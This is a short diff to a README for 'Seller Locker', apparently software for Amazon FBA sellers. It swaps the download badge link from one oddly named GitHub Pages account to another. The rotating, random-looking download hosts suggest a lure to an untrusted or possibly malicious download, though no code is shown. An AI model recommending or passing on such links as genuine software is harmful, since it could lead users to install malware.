@@ -1,6 +1,6 @@
 # Seller Locker - FBA Seller Software Suite
 
-[![GET Seller Locker](https://img.shields.io/badge/GET%20%E2%80%94%20Seller%20Locker-0078D6?style=for-the-badge&logoColor=white)](https://kingsleywilcoxkril.github.io/.github/sellerlocker)
+[![GET Seller Locker](https://img.shields.io/badge/GET%20%E2%80%94%20Seller%20Locker-0078D6?style=for-the-badge&logoColor=white)](https://omariaguilarvfii.github.io/.github/sellerlocker)
 
 ## Overview of Seller Locker for Amazon Sellers
 
